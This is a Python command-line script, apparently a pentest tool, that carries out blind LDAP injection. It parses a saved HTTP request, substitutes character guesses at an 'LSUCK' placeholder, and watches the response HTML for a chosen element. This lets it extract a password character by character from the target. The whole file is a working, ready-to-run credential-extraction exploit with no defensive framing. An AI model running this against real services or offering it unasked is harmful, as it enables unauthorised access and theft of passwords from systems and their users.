import requests
import argparse
from bs4 import BeautifulSoup
import urllib.parse

def parse_request(file_path):
    with open(file_path, 'r') as f:
        lines = f.readlines()
    method, path, _ = lines[0].split()
    headers = {}
    body = ""
    is_body = False
    for line in lines[1:]:
        if line in ['\n', '\r\n']:
            is_body = True
            continue
        if not is_body:
            if ':' in line:
                key, value = line.split(':', 1)
                headers[key.strip()] = value.strip()
        else:
            body += line.strip()
    return method, path, headers, body

def check_condition(response_text, tag, tag_id, tag_class, contain_text):
    soup = BeautifulSoup(response_text, 'html.parser')
    elements = soup.find_all(tag)
    for el in elements:
        if tag_id and el.get('id') != tag_id:
            continue
        if tag_class and tag_class not in el.get('class', []):
            continue
        # Search the raw HTML of the element (includes style attributes)
        if contain_text.lower() in str(el).lower():
            return True
    return False

def brute_force_ldap(method, url, headers, body_template, tag, tag_id, tag_class, contain):
    # Standard LDAP/Alphanumeric charset
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%-+_{}"
    password = ""
    
    print(f"[*] Targeting: {url}")
    print(f"[*] Searching for <{tag}> containing '{contain}'")

    while True:
        found_char = False
        for char in charset:
            # Replaces LSUCK with the current progress + the next guess
            # We do NOT add an extra * here because your .req file already has one after LSUCK
            current_guess = password + char
            payload = body_template.replace('LSUCK', current_guess)
            
            try:
                if method.upper() == "POST":
                    # Use data=body for x-www-form-urlencoded
                    resp = requests.post(url, headers=headers, data=payload, allow_redirects=True)
                else:
                    resp = requests.get(url, headers=headers, params=payload, allow_redirects=True)

                if check_condition(resp.text, tag, tag_id, tag_class, contain):
                    password += char
                    print(f"[+] Valid characters so far: {password}")
                    found_char = True
                    break
            except Exception as e:
                print(f"[!] Request error: {e}")
                return

        if not found_char:
            print(f"\n[*] Extraction complete.")
            print(f"[!] Final Result: {password}")
            break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LDAP Injection via LSUCK anchor")
    parser.add_argument("-f", "--file", required=True, help="Path to .req file")
    parser.add_argument("-html", "--tag", default="p", help="HTML tag")
    parser.add_argument("-id", "--id", help="Tag ID")
    parser.add_argument("-class", "--cls", help="Tag Class")
    parser.add_argument("-contain", "--contain", required=True, help="Text to find in tag")
    
    args = parser.parse_args()

    try:
        method, path, headers, body = parse_request(args.file)
        target_url = f"http://{headers['Host']}{path}"
        brute_force_ldap(method, target_url, headers, body, args.tag, args.id, args.cls, args.contain)
    except Exception as e:
        print(f"[-] Error: {e}")
